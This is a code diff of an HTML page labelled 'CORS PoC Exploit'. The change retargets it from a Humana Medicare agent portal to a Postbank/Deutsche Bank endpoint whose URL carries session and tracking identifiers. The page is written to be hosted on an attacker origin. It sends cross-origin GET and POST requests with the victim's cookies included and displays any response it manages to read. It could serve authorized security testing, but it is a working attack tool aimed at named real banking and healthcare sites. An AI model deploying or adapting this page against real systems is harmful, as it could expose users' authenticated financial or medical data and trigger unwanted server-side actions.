@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS PoC for Humana Medicare Agent Portal - Refined Error Handling</title>
+    <title>CORS PoC Exploit for at.postbank.de</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
     <style>
@@ -111,16 +111,17 @@
 <body>
 
     <div class="container">
-        <h1 class="header">CORS PoC for Humana Medicare Agent Portal</h1>
+        <h1 class="header">CORS PoC Exploit</h1>
         <p class="description">
             This page, hosted on a different origin (e.g., `attacker.com`), attempts to make cross-origin requests to
-            `https://medicareagent.humana.com/`.
+            the target endpoint: <br>
+            `https://at.postbank.de/m2/deutschebankag/mbox/json?...`
             <br><br>
-            <strong>For GET Requests:</strong> A successful CORS bypass would allow this page to read content from the target. If the browser blocks access, it's due to the Same-Origin Policy.
+            <strong>For GET Requests:</strong> If CORS is misconfigured, this page might be able to read content from the target. If the browser blocks access, it's due to the Same-Origin Policy.
             <br><br>
-            <strong>For POST Requests:</strong> A successful CORS bypass means the request was *sent* and *processed* by the server. Even if the response is unreadable (due to SOP), the action on the server might still occur (e.g., submitting a form, changing data). A 4xx or 5xx response visible here indicates the request reached the server.
+            <strong>For POST Requests:</strong> If CORS is misconfigured, the request might be *sent* and *processed* by the server, even if the response is unreadable by this page. A 4xx or 5xx response visible here indicates the request reached the server.
             <br><br>
-            <strong>Important:</strong> Check your browser's developer console (F12 > Console/Network) for detailed CORS errors.
+            <strong>Important:</strong> Always check your browser's developer console (F12 > Console/Network) for detailed CORS errors.
         </p>
         <button id="fetchGetButton" class="button get">Attempt Cross-Origin GET Request</button>
         <button id="fetchPostButton" class="button post">Attempt Cross-Origin POST Request</button>
@@ -133,7 +134,9 @@
     </div>
 
     <script>
-        const targetUrl = 'https://medicareagent.humana.com/'; // Target URL
+        // The target URL for the CORS PoC
+        const targetUrl = "https://at.postbank.de/m2/deutschebankag/mbox/json?mbox=target-global-mbox&mboxSession=78dc7445dc2c470697048638610785df&mboxPC=&mboxPage=31e878468690440a97d1d356e2a3a848&mboxRid=b7419c53f2354376984e0dec5a267504&mboxVersion=1.8.2&mboxCount=1&mboxTime=1661173721126&mboxHost=www.postbank.de&mboxURL=https%3A%2F%2Fwww.postbank.de%2F&mboxReferrer=&browserHeight=852&browserWidth=2085&browserTimeOffset=-240&screenHeight=1440&screenWidth=2560&colorDepth=24&devicePixelRatio=1.5&screenOrientation=landscape&webGLRenderer=ANGLE%20(AMD%2C%20AMD%20Radeon%20RX%205700%20XT%20Direct3D11%20vs_5_0%20ps_5_0%2C%20D3D11)&at_property=c496691e-def0-2c9a-c637-e9e6a8478923&mboxMCSDID=2C7870DC0D49E7F5-7C7F7A579A26B034&vst.trk=aa.postbank.de&vst.trks=aa.postbank.de&mboxMCGVID=03649537670837997911356623267805007258&mboxAAMB=RKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y&mboxMCGLH=7";
+
         const resultDiv = document.getElementById('result');
         const loadingSpinner = document.getElementById('loadingSpinner');
 
@@ -147,15 +150,13 @@
                 credentials: 'include' // Crucial for sending cookies cross-origin
             };
 
-            // For POST requests, add a body and content type
+            // For POST requests, add a dummy body and content type
             if (method === 'POST') {
-                // Dummy POST data for testing. You'll need to adapt this
-                // if you know a specific POST endpoint and its expected payload.
-                // For a general test, an empty or simple JSON object might suffice,
-                // but many endpoints require specific parameters.
+                // This is a dummy payload. The actual endpoint might expect specific data.
+                // For a general CORS test, any valid JSON or form data would suffice to trigger the POST.
                 const postData = {
-                    test_param: 'value',
-                    another_param: 'test'
+                    "action": "test",
+                    "value": "cors_poc_data"
                 };
                 requestOptions.headers = {
                     'Content-Type': 'application/json'
@@ -172,12 +173,12 @@
                     const text = await response.text();
                     resultDiv.classList.add('success');
                     resultDiv.textContent = `SUCCESS: ${method} request completed with status ${response.status} ${response.statusText}.
-${method} request likely processed and CORS allowed reading of response (highly unusual for sensitive public sites).
-\n\nResponse snippet (if readable):\n${text.substring(0, 1000)}... (truncated)`;
+Request likely processed and CORS allowed reading of response (this indicates a potential vulnerability if sensitive data is exposed).
+\n\nResponse snippet:\n${text.substring(0, 1000)}... (truncated)`;
                     console.log(`Full ${method} response text:`, text);
                 } else {
-                    // Handle non-2xx HTTP responses (e.g., 403, 401, 500)
-                    // We try to read the error text, but this also depends on CORS.
+                    // Handle non-2xx HTTP responses (e.g., 403, 401, 405, 500)
+                    // We attempt to read the error text, but this also depends on CORS.
                     let errorResponseText = '';
                     try {
                         errorResponseText = await response.text();
@@ -187,12 +188,15 @@ ${method} request likely processed and CORS allowed reading of response (highly 
 
                     let message = `Server responded to ${method} request with status ${response.status} ${response.statusText}.`;
 
-                    if (response.status === 403 || response.status === 401) {
-                        resultDiv.classList.add('warning'); // Use warning class for 403/401
-                        message += `\n\nThis is a *positive sign for CORS bypass*, as the request likely reached the server, but was denied due to authorization, missing CSRF token, or other server-side logic. The server *responded* to our cross-origin request.`;
+                    if (response.status >= 400 && response.status < 500) {
+                        resultDiv.classList.add('warning'); // Use warning class for client-side errors (4xx)
+                        message += `\n\nThis is a *positive sign for CORS bypass*, as the request likely reached the server, but was denied due to application-level logic (e.g., Method Not Allowed, Bad Request, Unauthorized, Forbidden). The server *responded* to our cross-origin request.`;
+                    } else if (response.status >= 500 && response.status < 600) {
+                        resultDiv.classList.add('error'); // Use error class for server-side errors (5xx)
+                        message += `\n\nServer-side error encountered. The request likely reached the server, but it failed to process it.`;
                     } else {
-                        resultDiv.classList.add('error'); // General error class
-                        message += `\n\nThis indicates an issue with the request or server processing, not necessarily a CORS block, but the request *did* reach the server.`;
+                        resultDiv.classList.add('error'); // General error class for other non-2xx statuses
+                        message += `\n\nAn unexpected non-2xx status was received. The request likely reached the server.`;
                     }
 
                     resultDiv.textContent = `${message}\n\nResponse content (if readable due to CORS):\n${errorResponseText.substring(0, 500)}... (truncated)`;
